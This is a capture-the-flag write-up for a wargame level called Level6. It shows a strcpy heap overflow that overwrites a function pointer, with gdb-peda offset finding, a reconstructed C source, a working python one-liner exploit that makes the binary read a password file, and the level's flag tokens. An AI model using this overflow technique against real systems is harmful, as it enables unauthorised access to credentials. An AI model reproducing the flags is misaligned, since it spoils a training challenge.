# Level6 - strcpy buffer overflow

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level6 | `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31` |
| level7 | `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute level6

```shell
./level6
> Segmentation fault (core dumped)

./level6 a
> Nope
```

The program segfault without an argument

Lets debug the binary

```shell
(gdb) info functions
gdb-peda$ pdisas main
gdb-peda$ pdisas m
gdb-peda$ pdisas n
```

See our assembly interpretation in [source file](../source.c)

```C
void n(void)
{
    system("/bin/cat /home/user/level7/.pass");
}

void m(char *str)
{
    puts(str);
}

int main(int argc, char **argv)
{
    char *dest;
    void *m_address;
    void *arg;

    dest = (void *)malloc(0x40);
    m_address = (void *)malloc(0x4);
    m_address = (void *)m;
    arg = argv + 4;
    strcpy(dest, arg);

    ((void (*)(void))m_address)();
}
```

It seems the function m in called through an address stored in a pointer.

As `strcpy` is vulnerable, the idea is to use the vulnerability to overwrite the pointer `m_address`

`strcpy` is vulnerable with buffer overflows. We have to find the offset

```shell
gdb-peda$ pset arg cyclic_pattern(200)
gdb-peda$ run
gdb-peda$ pattern search
> Registers contain pattern buffer:
  EIP+0 found at offset: 72
  EAX+0 found at offset: 72
```

The offset is 72

And the address of n-function is `0x08048454`

Now we have everything we need, lets build our exploit.

Our exploit will contain 72 characters followed by a return address that aims n-function address.

```bash
~/level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## Sources

### Format string vulnerability

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
- [FR - Buffer overflow](https://beta.hackndo.com/buffer-overflow/)

### Shell

- [Man malloc](https://linux.die.net/man/3/malloc)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man strcpy](https://linux.die.net/man/3/strcpy)
- [Man system](https://linux.die.net/man/3/system)
